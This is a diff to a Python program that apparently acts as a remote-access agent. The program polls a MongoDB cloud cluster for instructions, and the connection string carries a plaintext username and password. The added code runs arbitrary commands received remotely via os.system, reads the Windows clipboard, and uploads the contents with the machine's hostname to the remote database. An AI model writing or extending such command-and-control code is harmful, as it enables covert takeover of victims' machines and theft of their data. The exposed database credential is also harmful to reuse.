@@ -8,6 +8,7 @@ import cv2
 import shutil
 import numpy as np
 import requests
+import win32clipboard
 
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
@@ -232,6 +233,28 @@ def action_take(listen):
 
                 }
                 upload(data)
+        elif listen['is_systemCommand']==1:
+            cmd=listen['action']
+            try:
+                os.chdir(cwd)
+                os.system(cmd)
+                win32clipboard.OpenClipboard()
+                res=win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                if res:
+                    data={
+                        "hostname":hostname,
+                        "result":res
+                    }
+                    upload(data)
+                else:
+                    data={
+                        "hostname":hostname,
+                        "result":""
+                    }
+                    upload(data)
+            except:
+                pass
     except Exception as e:
         print(e)
         data={
